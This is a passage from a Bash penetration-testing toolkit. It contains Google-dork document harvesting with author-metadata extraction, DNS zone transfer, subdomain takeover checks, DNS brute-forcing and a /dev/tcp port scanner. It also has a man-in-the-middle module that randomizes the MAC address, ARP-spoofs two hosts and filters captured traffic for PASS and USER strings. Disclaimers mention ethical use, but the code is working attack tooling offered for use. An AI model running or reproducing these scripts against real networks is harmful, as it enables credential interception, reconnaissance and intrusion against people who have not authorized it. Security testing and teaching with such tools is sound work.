        # -hiddenlinks=merge: Merges hidden links into the document.
        # -force_html: Forces the document to be interpreted as HTML.
        SEARCH="lynx -dump -hiddenlinks=merge -force_html"
        
        # Function to prompt the user for required input
        function metadata_analysis_menu() {
            clear;  # Clears the terminal screen to give a clean interface
            ascii_banner_art;  # Displays a banner or logo at the top of the screen
            
            # Display the title of this analysis step with colored formatting
            echo -e "${MAGENTA} 4 - Metadata Analysis ${RESET}"
            
            subtitle;  # Displays a subtitle or additional details about the script

            # Prompt the user to enter the domain or website they want to analyze (e.g., government or business domains)
            echo -n " Enter the domain or extension to search (e.g., businesscorp.com.br): "
            read -r SITE  # Read the user's input and store it in the SITE variable

            # Prompt the user to enter the file type they want to search for (e.g., PDFs, DOCX)
            echo -n " Enter the file extension to search for (e.g., pdf): "
            read -r FILE  # Read the user's input and store it in the FILE variable

            # Prompt the user to optionally specify a keyword to refine the search (e.g., specific topics or terms)
            echo -n " [Optional] Enter a keyword to refine the search (e.g., user): "
            read -r KEYWORD  # Read the user's input and store it in the KEYWORD variable
        }


        function perform_search() {
            # Helper function to log search results
            function log_results() {
                local file="$1"
                if [[ -s "$file" ]]; then
                    echo -e "${GREEN} Search successful. Results saved to $file ${RESET}"
                else
                    echo -e "${RED} No results found for the specified search criteria. ${RESET}"
                    local raw_results_file="raw_results_${TIMESTAMP}.txt"
                    echo -e "${RED} Raw search results saved to ${YELLOW}$raw_results_file ${RESET}"
                    mv "$file" "$raw_results_file"  # Save the empty file as raw results for debugging
                fi
            }

            # Generate the timestamp and file names
            TIMESTAMP=$(date +%d%H%M%b%Y)
            FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"

            # Build the search query
            local base_query="https://www.google.com/search?q=inurl:$SITE+filetype:$FILE"
            if [[ -n "$KEYWORD" ]]; then
                echo -e "${MAGENTA} Searching for $FILE files with \"$KEYWORD\" on $SITE... ${RESET}"
                base_query+="+intext:$KEYWORD"
            else
                echo -e "${MAGENTA} Searching for $FILE files on $SITE... ${RESET}"
            fi

            # Perform the search and filter results
            echo ""
            $SEARCH "$base_query" \
                | grep -Eo 'https?://[^ ]+\.'"$FILE" \
                | cut -d '=' -f2'' > "$FILTERED_RESULTS_FILE"

            # Log the results
            log_results "$FILTERED_RESULTS_FILE"
        }       
        
        # Function to download files from the search results
        function download_files() {
            USER_AGENTS=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36"
                "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0"
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36"
                "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Mobile Safari/537.36"
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.119 Safari/537.36 Edg/109.0.774.68"
            )

            FILE_LIST="$1"
            FOLDER="${SITE}_${TIMESTAMP}"
            mkdir -p "$FOLDER"
            FAILED_DOWNLOADS=0

            while IFS= read -r URL; do
                RANDOM_USER_AGENT="${USER_AGENTS[RANDOM % ${#USER_AGENTS[@]}]}"
                echo -e "${MAGENTA} ==========================================================================${RESET}"
                echo -e "${MAGENTA} Downloading file with ${RANDOM_USER_AGENT} ${RESET}"
                wget --user-agent="$RANDOM_USER_AGENT" -P "$FOLDER" "$URL"

                # Check if the file was successfully downloaded
                if [[ $? -ne 0 ]]; then
                    echo -e "${RED} Failed to download: $URL ${RESET}"
                    ((FAILED_DOWNLOADS++))
                fi
                echo -e "${MAGENTA} ==========================================================================${RESET}"
            done < "$FILE_LIST"

            rm -f "$FILE_LIST"  # Clean up the temporary results file

            if [[ $FAILED_DOWNLOADS -gt 0 ]]; then
                echo -e "${YELLOW} Warning: $FAILED_DOWNLOADS files failed to download. ${RESET}"
            fi
        }

        # Function to extract metadata for Author, Producer, Creator, and MIME Type
        function extract_metadata_summary() {
            FOLDER="${SITE}_${TIMESTAMP}"
            METADATA_FILE="${FOLDER}_metadata_summary.txt"
            echo -e "${MAGENTA} Extracting metadata from files in: $FOLDER ${RESET}"

            # Check if folder contains files
            if [[ -z "$(ls -A "$FOLDER")" ]]; then
                echo -e "${RED} No files found in $FOLDER to extract metadata. ${RESET}"
                echo -e "${GRAY} Returning to main menu.${RESET}"
                return 1
            fi

            # Initialize the metadata summary file
            echo -e "Metadata Summary for $SITE - Generated on $(date)\n" > "$METADATA_FILE"

            # Use exiftool to extract metadata and filter relevant fields
            exiftool "$FOLDER"/* | grep -E "^(Author|Producer|Creator|MIME Type)" >> "$METADATA_FILE"

            if [[ -s "$METADATA_FILE" ]]; then
                echo -e "${GREEN} Metadata summary saved to: $METADATA_FILE ${RESET}"
            else
                echo -e "${RED} No metadata extracted. Metadata file is empty. ${RESET}"
            fi
        }

        # Function to process, organize, and export metadata
        function process_metadata_summary() {
            FOLDER="${SITE}_${TIMESTAMP}"
            METADATA_FILE="${FOLDER}_metadata_summary.txt"
            ORGANIZED_METADATA_FILE="${FOLDER}_organized_metadata_summary.txt"
            CSV_FILE="${FOLDER}_metadata_summary.csv"

            echo -e "${MAGENTA} Processing and organizing metadata for: $METADATA_FILE ${RESET}"

            # Initialize the organized metadata file
            echo -e "Organized Metadata Summary for $SITE - Generated on $(date)\n" > "$ORGANIZED_METADATA_FILE"

            # Initialize the CSV file with headers
            echo "Type,Value,Count" > "$CSV_FILE"

            # Group by software (Creator Tool and Producer)
            echo -e "=== Software Used (Creator Tool and Producer) ===\n" >> "$ORGANIZED_METADATA_FILE"
            grep -E "^(Creator Tool|Producer)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
                echo "$FIELD,$VALUE,$COUNT" >> "$CSV_FILE" # Add to CSV
                printf "%-30s : %s (%s occurrences)\n" "$FIELD" "$VALUE" "$COUNT" >> "$ORGANIZED_METADATA_FILE"
            done

            # Group by persons (Creator and Author)
            echo -e "\n=== People Found (Creator and Author) ===\n" >> "$ORGANIZED_METADATA_FILE"
            grep -E "^(Creator|Author)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
                echo "$FIELD,$VALUE,$COUNT" >> "$CSV_FILE" # Add to CSV
                printf "%-30s : %s (%s occurrences)\n" "$FIELD" "$VALUE" "$COUNT" >> "$ORGANIZED_METADATA_FILE"
            done

            echo -e "${GREEN} Organized metadata saved to: $ORGANIZED_METADATA_FILE ${RESET}"
            echo -e "${GREEN} Metadata CSV saved to: $CSV_FILE ${RESET}"

            # Display summary on the screen
            echo -e "\n${CYAN}=== Screen Summary ===${RESET}"
            echo -e "${YELLOW}Top Software Used:${RESET}"
            grep -E "^(Creator Tool|Producer)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
                echo "  $FIELD: $VALUE ($COUNT occurrences)"
            done

            echo -e "\n${YELLOW}Top People Mentioned:${RESET}"
            grep -E "^(Creator|Author)" "$METADATA_FILE" | sort | uniq -c | sort -nr | while read -r COUNT FIELD VALUE; do
                echo "  $FIELD: $VALUE ($COUNT occurrences)"
            done
        }

        # Function to handle errors for empty results or missing files
        function handle_empty_results() {
            local file_to_check="$1"
            local context_message="$2"

            if [[ ! -f "$file_to_check" ]]; then
                echo -e "${RED} Error: $context_message - File does not exist. ${RESET}"
                echo -e "${YELLOW} Please check your search criteria or connection. ${RESET}"
                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
                read -r 2>/dev/null
                main_menu
                return 1
            fi

            if [[ ! -s "$file_to_check" ]]; then
                echo -e "${RED} Error: $context_message - File is empty. ${RESET}"
                echo -e "${YELLOW} This usually happens when no results were found or when you got a Google ban! =/ ${RESET}"
                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
                read -r 2>/dev/null
                main_menu
                return 1
            fi
            return 0  # File exists and is not empty
        }

        # Function to handle the entire metadata analysis workflow
        function run_metadata_analysis() {
            # Step 1: Prompt user for inputs
            metadata_analysis_menu

            # Step 2: Perform the search and save filtered URLs
            perform_search

            # Step 3: Check and handle filtered results file
            FILTERED_RESULTS_FILE="${TIMESTAMP}_${SITE}_${FILE}_filtered.txt"
            handle_empty_results "$FILTERED_RESULTS_FILE" "Search results for filtered URLs" || return

            # Step 4: Download files
            download_files "$FILTERED_RESULTS_FILE"

            # Step 5: Extract metadata from downloaded files
            extract_metadata_summary  # This generates METADATA_FILE

            # Step 6: Check and handle metadata file
            METADATA_FILE="${SITE}_${TIMESTAMP}_metadata_summary.txt"
            handle_empty_results "$METADATA_FILE" "Extracted metadata summary" || return

            # Step 7: Process metadata and export CSV
            process_metadata_summary

            # Final step: Return to main menu
            echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
            read -r 2>/dev/null
            main_menu
        }

        # Ensure main workflow is executed
        run_metadata_analysis;

    }

    # Function: Perform DNS Zone Transfer for reconnaissance
    function dns_zt() {
        # v_dns_zt - Perform DNS Zone Transfer for reconnaissance
            #
            # Description:
            # This script automates a DNS Zone Transfer (a DNS recon technique) to attempt retrieval of all DNS zone records 
            # from the target's DNS server. It is a useful reconnaissance step when exploring the DNS structure of a domain.
            # 
            # Steps:
            # 1. Prompts the user to input the target domain or URL (e.g., example.com).
            # 2. Retrieves the nameservers (NS records) for the specified domain.
            # 3. Iterates over each nameserver and attempts a DNS Zone Transfer.
            #
            # Dependencies:
            # - `host`: A tool used to query DNS records and perform the zone transfer.
            #
            # Notes:
            # - Ensure this script is used only for ethical purposes with proper authorization.
            # - Zone transfers may fail if DNS servers are configured securely to block unauthorized access.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-25
            # Last Updated: 2025-01-26
            # Version: 1.1
            #
            # Example usage:
            # - Input: example.com
            # - Output: Lists the DNS zone records if the transfer is successful.
            #
            # Example results:
            # - Nameserver: ns1.example.com
            #   Zone Records:
            #   - A records
            #   - MX records
            #   - TXT records
            #
            # Disclaimer:
            # - Unauthorized use of this script is prohibited. Always ensure you have explicit permission before testing.
        
        # Function: Display menu to collect user input
        function dns_zt_main_menu() {
            clear;  # Clear the terminal for a clean interface
            ascii_banner_art;  # Display an ASCII banner
            echo -e "${MAGENTA} DNS Zone Transfer ${RESET}"  # Show the operation's name
            subtitle;  # Add a decorative subtitle
            echo -en "${RED} Enter the target domain or URL: ${RESET}"  # Ask for the target domain
            read -r TARGET  # Store user input in the TARGET variable
        }

        # Function: Validate if nameservers exist for the target
        function dnz_zt_check() {
            # Fetch the nameservers (NS records) for the domain
            NS_SERVERS=$(host -t ns "$TARGET" | awk '{print $4}')

            # Check if any nameservers were found
            if [[ -z "$NS_SERVERS" ]]; then
                # If no nameservers are found, notify the user and return to the main menu
                echo -e "${RED} No nameservers found for the domain $TARGET. ${RESET}"
                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
                read -r 2> /dev/null  # Wait for the user to press Enter
                main_menu;  # Redirect back to the main menu
                return  # Exit the function to prevent further execution
            fi
        }

        # Function: Attempt a DNS Zone Transfer on each nameserver
        function dns_zt_attack() {
            # Loop through each nameserver and perform the zone transfer attempt
            for SERVER in $NS_SERVERS; do
                echo -e "${CYAN} Attempting zone transfer on nameserver: $SERVER ${RESET}"  # Notify the user of progress
                host -l -a "$TARGET" "$SERVER"  # Run the zone transfer command for the current nameserver
            done
        }

        # Function: Control the entire workflow of the DNS Zone Transfer operation
        function dns_zt_workflow() {
            dns_zt_main_menu;  # Collect user input
            dnz_zt_check;  # Validate nameservers
            dns_zt_attack;  # Perform the attack
            pause_script;  # Pause and wait for user input before returning
            main_menu;  # Return to the main menu
        }

        # Execute the DNS Zone Transfer workflow
        dns_zt_workflow;
    }

    # Function: Perform a Subdomain Takeover check
    function Subdomain_takeover() {
        # vi_Subdomain_takeover - Perform a Subdomain Takeover check
            #
            # Description:
            # This script automates the process of detecting potential Subdomain Takeover vulnerabilities.
            # It works by:
            # 1. Prompting the user to input the target domain and a file containing subdomains to test.
            # 2. Iterating over each subdomain in the provided file.
            # 3. Checking the CNAME records of each subdomain to identify potential takeovers.
            #
            # Dependencies:
            # - `host`: Used to query CNAME records for subdomains.
            #
            # Notes:
            # - Ensure you have the proper permissions and ethical clearance before testing any domain.
            # - The file containing subdomains should have one subdomain per line.
            #
            # Example usage:
            # - Input: Target domain: example.com
            #         Subdomain file: subdomains.txt
            # - Output: Lists any subdomains with a CNAME record that indicates a possible takeover vulnerability.
            #
            # Example result:
            # - Subdomain: vulnerable.example.com
            #   CNAME: alias-for-unused-service.s3.amazonaws.com
            #
            # Created on: 2025-01-26
            # Last Updated: 2025-01-26
            # Version: 1.0
            #
            # Author: R3v4N (w/GPT)
            #
        
        
        # Function: Collect user inputs
        function collect_inputs() {
            clear;  # Clear the terminal screen for clean output
            ascii_banner_art;  # Display ASCII art banner
            echo -e "${MAGENTA} Subdomain Takeover ${RESET}"
            subtitle;  # Display a subtitle

            # Prompt for the target domain
            echo -en "${CYAN} Enter the target domain (e.g., example.com): ${RESET}"
            read -r HOST  # Store the target domain in the HOST variable

            # Prompt for the file containing subdomains
            echo -en "${CYAN} Enter the file containing subdomains (one per line): ${RESET}"
            read -r FILE  # Store the file path in the FILE variable

            # Validate that the file exists and is not empty
            if [[ ! -f "$FILE" || ! -s "$FILE" ]]; then
                echo -e "${RED} Error: The specified file does not exist or is empty. ${RESET}"
                echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
                read -r 2> /dev/null
                main_menu
                return 1
            fi
        }

        # Function: Perform Subdomain Takeover check
        function perform_takeover_check() {
            # Define the command to check CNAME records
            COMMAND="host -t cname"

            # Iterate over each subdomain in the file
            echo -e "${CYAN} Checking for potential Subdomain Takeover vulnerabilities... ${RESET}"
            while IFS= read -r WORD; do
                RESULT=$($COMMAND "$WORD"."$HOST" 2>/dev/null | grep "alias for")
                if [[ -n "$RESULT" ]]; then
                    # Print results if a CNAME alias is found
                    echo -e "${YELLOW} Subdomain: ${RESET}$WORD.$HOST"
                    echo -e "${GREEN} CNAME: ${RESET}$RESULT"
                fi
            done < "$FILE"
        }

        # Function: Control the workflow
        function takeover_workflow() {
            collect_inputs || return  # Collect inputs and return if validation fails
            perform_takeover_check  # Perform the subdomain takeover checks
            pause_script  # Pause and wait for the user before returning to the menu
            main_menu  # Return to the main menu
        }

        # Execute the workflow
        takeover_workflow
    }

    # Function: Perform Reverse DNS Lookup for a specified range of IP addresses
    function rev_dns() {
        # vii_rev_dns - Perform Reverse DNS Lookup for a specified range of IP addresses
            #
            # Description:
            # This script automates a reverse DNS lookup operation for a range of IP addresses.
            # It performs the following operations:
            # 1. Prompts the user for the base address and IP range.
            # 2. Iterates over the specified range and queries DNS for PTR records.
            # 3. Saves the results to a timestamped file and displays the output to the user.
            #
            # Notes:
            # - Requires the `host` command to perform DNS lookups.
            # - Output is saved in a timestamped file for reference.
            # - Designed for educational purposes; ensure proper permissions for testing.
            #
            # Example usage:
            # - Input:
            #   - Base address: 192.168.0
            #   - Range: Start = 1, End = 10
            # - Output:
            #   - PTR records for IPs 192.168.0.1 through 192.168.0.10.
            #
            # Created on: 2025-01-26
            # Last Updated: 2025-01-26
            # Version: 1.1
            #
            # Author: R3v4N (w/GPT)
            #

        local title="Reverse DNS Lookup"  # Define the title for this operation

        # Function to prompt the user for inputs
        function prompt_user_inputs() {
            
            echo -en " Enter the base address (e.g., 192.168.0): ${RESET}"
            read -r BASE_ADDRESS  # Read the base address from the user

            echo -en " Enter the start of the IP range: ${RESET}"
            read -r START  # Read the start of the IP range

            echo -en " Enter the end of the IP range: ${RESET}"
            read -r END  # Read the end of the IP range
        }

        # Function to prepare the output file
        function prepare_output_file() {
            TIMESTAMP=$(date +%d%H%M%b%Y)  # Generate a timestamp
            OUTPUT_FILE="${BASE_ADDRESS}.${START}-${END}_${TIMESTAMP}.txt"  # Define the output file name

            rm -rf "$OUTPUT_FILE"  # Remove the file if it exists
            touch "$OUTPUT_FILE"  # Create a new empty file
        }

        # Function to perform reverse DNS lookups
        function perform_reverse_dns() {
            echo -e "${YELLOW} Performing reverse DNS lookups for range: ${BASE_ADDRESS}.${START}-${END} ${RESET}"
            for RANGE in $(seq "$START" "$END"); do
                # Query the PTR record and filter the result
                host -t ptr "${BASE_ADDRESS}.${RANGE}" \
                    | cut -d ' ' -f5 \
                    | grep -v '.ip-' >> "$OUTPUT_FILE"
            done
        }

        # Function to display results
        function display_results() {
            echo -e "${GREEN} Reverse DNS lookup results saved to: $OUTPUT_FILE ${RESET}"
            echo -e "${CYAN}=== Results ===${RESET}"
            cat "$OUTPUT_FILE"  # Display the contents of the output file
        }

        # Main workflow for the reverse DNS lookup
        function reverse_dns_workflow() {
            
            display_banner_inside_functions;  # Display the sub-menu for Reverse DNS Lookup
            prompt_user_inputs  # Prompt the user for inputs
            prepare_output_file  # Prepare the output file
            perform_reverse_dns  # Perform reverse DNS lookups
            display_results  # Display the results to the user
            exit_to_main_menu; # Exit the script and return to the main menu
        }

        # Execute the main workflow
        reverse_dns_workflow
    }
    
    # Function: Perform DNS reconnaissance on a target domain using a subdomain wordlist
    function recon_dns() {
        # viii_recon_dns - Perform DNS reconnaissance on a target domain using a subdomain wordlist
            #
            # Description:
            # This script automates DNS reconnaissance by iterating through a list of subdomains
            # and performing DNS queries to identify active subdomains. The results are saved in
            # a timestamped file for later analysis.
            #
            # Notes:
            # - Requires the `host` command to perform DNS queries.
            # - The script uses a predefined wordlist located at `/usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt`.
            # - Displays progress to the user during execution.
            #
            # Example usage:
            # - Input:
            #   - Target domain: businesscorp.com.br
            # - Output:
            #   - File `dns_recon_businesscorp.com.br_<timestamp>.txt` containing active subdomains.
            #
            # Created on: 2025-01-26
            # Last Updated: 2025-01-26
            # Version: 1.1
            #
            # Author: R3v4N (w/GPT)
            #

        local title="DNS Reconnaissance"  # Define the title for this operation

        # Function to load and count the total lines in the subdomain wordlist
        function load_wordlist() {
                WORDLIST="/usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt"  # Path to the wordlist
                if [[ ! -f "$WORDLIST" ]]; then
                    echo -e "${RED}Error: Wordlist not found at $WORDLIST.${RESET}"
                    echo -e "${GRAY} Press ENTER to return to the main menu.${RESET}"
                    read -r 2>/dev/null
                    main_menu
                    return 1
                fi
                TOTAL_LINES=$(wc -l "$WORDLIST" | awk '{print $1}')  # Count the total lines
            }

            # Function to prompt the user for the target domain
            function prompt_user_inputs() {
                echo -en "${CYAN} Enter the target domain (e.g., businesscorp.com.br): ${RESET}"
                read -r DOMAIN  # Read the domain input from the user
            }

            # Function to prepare the output file
            function prepare_output_file() {
                TIMESTAMP=$(date +%d%H%M%b%Y)  # Generate a timestamp
                OUTPUT_FILE="dns_recon_${DOMAIN}_${TIMESTAMP}.txt"  # Define the output file name

                rm -rf "$OUTPUT_FILE"  # Remove the file if it exists
                touch "$OUTPUT_FILE"  # Create a new empty file
            }

            # Function to perform DNS reconnaissance
            function perform_dns_recon() {
                LINE_COUNT=0  # Initialize the line counter

                echo -e "${YELLOW} Starting DNS reconnaissance for: $DOMAIN ${RESET}"
                for SUBDOMAIN in $(cat "$WORDLIST"); do
                    ((LINE_COUNT++))  # Increment the line counter

                    # Query the DNS for the current subdomain and append results to the output file
                    host "$SUBDOMAIN.$DOMAIN" >> "$OUTPUT_FILE"

                    # Display the progress
                    echo -e "${CYAN}-------- Searching ---------> $LINE_COUNT/$TOTAL_LINES ${RESET}"
                done
        }

        # Function to display results
        function display_results() {
            echo -e "${GREEN} DNS reconnaissance results saved to: $OUTPUT_FILE ${RESET}"
            echo -e "${CYAN}=== Results Preview ===${RESET}"
            head -n 10 "$OUTPUT_FILE"  # Display the first 10 lines as a preview
            echo -e "${YELLOW}... (Full results available in the output file) ${RESET}"
        }

        # Main workflow for DNS reconnaissance
        function dns_recon_workflow() {
            display_banner_inside_functions;
            load_wordlist || return  # Load the wordlist and validate its existence
            prompt_user_inputs  # Prompt the user for inputs
            prepare_output_file  # Prepare the output file
            perform_dns_recon  # Perform DNS reconnaissance
            display_results  # Display the results to the user
            exit_to_main_menu # Exit the script and return to the main menu
        }

        # Execute the main workflow
        dns_recon_workflow
    }
    
    # Function: Perform a Man-in-the-Middle (MiTM) attack
    function mitm() {
        # Function: x_mitm - Perform a Man-in-the-Middle (MiTM) attack
            #
            # Description:
            # This script automates the setup and execution of a MiTM attack.
            # It performs the following operations:
            # 1. Identifies the network interface and attack network.
            # 2. Enables packet forwarding for the host system.
            # 3. Sets up spoofing, packet capture, and analysis tools.
            # 4. Captures and filters traffic between two specified targets.
            #
            # Dependencies:
            # - ipcalc: For calculating network ranges.
            # - macchanger: To randomize the MAC address.
            # - tilix: For launching new terminal sessions.
            # - arpspoof: For ARP spoofing.
            # - tcpdump: For capturing and filtering packets.
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-25
            # Last Updated: 2025-01-25
            # Version: 1.2
            #
            # Notes:
            # - Ensure all dependencies are installed.
            # - This script is intended for ethical testing only.
            # - Always have explicit permission before performing MiTM operations.
            # - Make sure to properly configure your network and firewall rules.
            #


        local title="Man-in-the-Middle (MiTM) Attack"  # Define the title for this operation

        # Function to check if all required dependencies are installed
        function check_dependencies() {
            local dependencies=("ipcalc" "macchanger" "konsole" "arpspoof" "tcpdump")
            for tool in "${dependencies[@]}"; do
                if ! command -v "$tool" &>/dev/null; then
                    echo -e "${RED} Error: $tool is not installed. Please install it and try again.${RESET}"
                    exit 1
                fi
            done
        }

        # Function to identify the network interface and attack network
        function identify_attack_environment() {
            INTERFACE=$(ip -br a | grep tap | awk '{print $1}' | head -n 1)
            NETWORK=$(ipcalc "$(ip -br a | grep tap | awk '{print $3}' | awk -F '/' '{print $1}')" \
                | grep -F "Network:" | awk '{print $2}')

            if [[ -z "$INTERFACE" || -z "$NETWORK" ]]; then
                echo -e "${RED} Error: Could not determine attack interface or network.${RESET}"
                exit 1
            fi
        }

        # Function to display attack setup information
        function display_attack_info() {
            clear
            echo "============= 0.0wL ============="
            echo "ATTACK INTERFACE: $INTERFACE"
            echo "ATTACK NETWORK: $NETWORK"
            echo "================================="
        }

        # Function to enable packet forwarding on the system
        function enable_packet_forwarding() {
            echo 1 > /proc/sys/net/ipv4/ip_forward
            echo "================================="
            echo "PACKET ROUTING ENABLED"
            echo "================================="
        }

        # Function to validate user-entered IP addresses
        function validate_ip() {
            local ip="$1"
            if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || ! ipcalc -c "$ip" &>/dev/null; then
                echo -e "${RED}Error: Invalid IP address: $ip${RESET}"
                return 1
            fi
            return 0
        }

        # Function to set up the MiTM environment
        function setup_mitm_environment() {
            macchanger -r "$INTERFACE" || { echo "Error: MAC address change failed."; exit 1; }

            # Start Netdiscover for network discovery
            tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $NETWORK" &
            sleep 10  # Allow time for network scanning

            # Prompt user for target IP addresses and validate them
            while true; do
                echo -n "Enter the IP of TARGET 01: "
                read -r TARGET_01
                validate_ip "$TARGET_01" && break
            done

            while true; do
                echo -n "Enter the IP of TARGET 02: "
                read -r TARGET_02
                validate_ip "$TARGET_02" && break
            done

            # Start ARP spoofing in a separate session
            tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $TARGET_01 -r $TARGET_02" &

            # Start packet capture and filter sensitive data
            tcpdump -i "$INTERFACE" -t host "$TARGET_01" and host "$TARGET_02" \
                'tcp[((tcp[12:1] & 0xf0) >> 4) * 4:]' \
                | grep -E '\[P.\]' \
                | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' \
                | tee captures.txt
        }

        # Function to clean up and restore system settings
        function cleanup() {
            echo -e "${RED} Stopping attack and restoring system settings...${RESET}"
            pkill -f arpspoof
            pkill -f tcpdump
            macchanger -p "$INTERFACE"  # Restore the original MAC address
            echo "${GREEN} >>> Cleanup complete. <<<${RESET}"
        }

        # Function to run the full MiTM attack workflow
        function main_mitm() {
            display_banner_inside_functions                 # Call the header function
            trap cleanup EXIT  # Ensure cleanup runs on script exit
            check_dependencies       # Verify required tools are installed
            identify_attack_environment  # Detect attack network and interface
            display_attack_info      # Display attack setup information
            enable_packet_forwarding # Enable system packet forwarding
            setup_mitm_environment   # Configure MITM attack environment
            exit_to_main_menu        # Return to the main menu
        }

        # Execute the MiTM attack workflow
        main_mitm
    }

    # Function: Perform a Bash-based TCP port scan
    function portscan_bashsocket(){
        # Function: x_portscan_bashsocket - Perform a Bash-based TCP port scan
            #
            # Description:
            # This script performs a port scan on a specified target using Bash sockets.
            # It checks for open TCP ports within a given range.
            #
            # Dependencies:
            # - Bash with TCP socket support (`/dev/tcp/`)
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-25
            # Last Updated: 2025-01-25
            # Version: 1.3
            #
            # Notes:
            # - This script is intended for ethical testing only.
            # - Use responsibly and ensure you have permission before scanning any target.

        title="Bash Socket Port Scanner"  # Define the title for this operation
        # Function to validate IPv4 address or hostname
        LOG_DIR="./scan_logs"  # Directory for logs
        mkdir -p "$LOG_DIR"  # Ensure log directory exists

        # Function to validate IPv4 address or hostname
        function validate_target() {
            local target="$1"
            if [[ "$target" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
                return 0  # Valid IPv4
            elif [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
                return 0  # Valid hostname
            else
                echo -e "${RED}Error: Invalid target entered. Please enter a valid IP or hostname.${RESET}"
                return 1
            fi
        }

        # Function to scan a single port (with timeout) and log results
        function scan_port() {
            local target="$1"
            local port="$2"
            local log_file="$3"

            if timeout 1 bash -c "exec 3<>/dev/tcp/$target/$port" 2>/dev/null; then
                echo -e "${MAGENTA} Port $port -> ${GREEN}[OPEN] ${RESET}" | tee -a "$log_file"
            fi
        }

        # Function to perform port scanning with logging
        function perform_port_scan() {
            local target="$1"
            local start_port="$2"
            local end_port="$3"
            local log_file="${LOG_DIR}/scan_${target}_$(date +%d%m%Y_%H%M%S).log"
            local max_parallel_jobs=100  # Allow more parallel scans without freezing

            echo -e "${GREEN}-----------------------------------------------------${RESET}"
            echo -e " Scanning target: ${YELLOW}$target${RESET} (Ports: $start_port-$end_port)"
            echo -e "${GREEN}-----------------------------------------------------${RESET}"
            echo -e "${GREEN} Port scan log for ${YELLOW}$target (Scanned on $(date))${RESET}" > "$log_file"

            for ((port=start_port; port<=end_port; port++)); do
                scan_port "$target" "$port" "$log_file" &

                # Control number of parallel jobs to prevent system overload
                if (( $(jobs -p | wc -l) >= max_parallel_jobs )); then
                    wait -n  # Wait for at least one job to finish before spawning new ones
                fi
            done

            wait  # Ensure all remaining jobs finish
            echo -e "\n${CYAN} Scan complete. Log saved to: $log_file ${RESET}"

        }

        function user_input(){
            # Get user input for target
            while true; do
                echo -ne "${RED} Enter target IP or domain: ${RESET}"
                read -r target
                validate_target "$target" && break
            done

            # Get user input for port range
            echo -ne "${RED} Enter start port (default: 1): ${RESET}"
            read -r start_port
            start_port=${start_port:-1}  # Default to 1 if empty

            echo -ne "${RED} Enter end port (default: 65535): ${RESET}"
            read -r end_port
            end_port=${end_port:-65535}  # Default to 65535 if empty

            # Validate port numbers
            if [[ ! "$start_port" =~ ^[0-9]+$ ]] || [[ ! "$end_port" =~ ^[0-9]+$ ]] || ((start_port > end_port)); then
                echo -e "${RED} >>> Error: Invalid port range. Please enter valid numbers. <<< ${RESET}"
                return
            fi

            export target start_port end_port

        }

        # Function to run the port scan workflow
        function portscan_workflow() {
            clear; # clear terminal
            display_banner_inside_functions; 
            user_input;
            perform_port_scan "$target" "$start_port" "$end_port" # Start the scan
            exit_to_main_menu; # Return to main menu
        }

        # Execute port scan function
        portscan_workflow;
    }
    
    # Function: Show a list of useful Linux networking commands
    function useful_linux_commands() {
        # Function: Display useful Linux networking commands
            #
            # Description:
            # This script presents a collection of useful Linux commands for network management,
            # including commands for checking ARP tables, network interfaces, active connections,
            # and routing information.
            #
            # Dependencies:
            # - Basic Linux utilities (arp, ifconfig, ip, netstat, ss, route)
            #
            # Author: R3v4N (w/GPT)
            # Created on: 2025-01-25
            # Last Updated: 2025-01-25
            # Version: 1.1
            #
            # Notes:
            # - These commands are useful for system administrators and penetration testers.
            # - Some commands require administrative privileges (sudo).
            #
            # Example usage:
            # - Running this function will display categorized networking commands.

        title="Useful Linux Networking Commands"  # Define the title for this operation

        # Function to display useful network management commands
        function network_management_commands() {
            display_section_no_log "USEFUL NETOWRK MANAGEMENT COMMANDS"
            
                display_description "List ARP Table"
                    display_command  "arp -a" 
                    display_command "ip neigh show"
            
                display_description "Show Configured IPs" 
                    display_command "ifconfig -a"
                    display_command "ip addr"
            
                display_description "Enable/Disable Network Interface"
                    display_command  "ifconfig eth0 up/down"
                    display_command "ip link set eth0 up/down"
            
            echo -e "${GRAY} Note: Replace 'eth0' with your actual network interface. Use 'ifconfig -a' or 'ip addr' to find it.${RESET}"
            echo
            subtitle;  # Add a decorative subtitle
        }

        # Function to display connection monitoring commands
        function connection_monitoring_commands() {
            display_section_no_log " ACTIVE CONNECTIONS"
            
            display_description "Show Active Connections"
            display_command "netstat"
            display_command "ss"
            
            echo -e "${GRAY} Note: To check for suspicious connections, use 'ss -lntp'.${RESET}"
            echo
            subtitle;  # Add a decorative subtitle
        }

        # Function to display routing-related commands
        function routing_commands() {
            display_section_no_log " ROUTING INFORMATION"
            
            display_description "Show Routing Table"
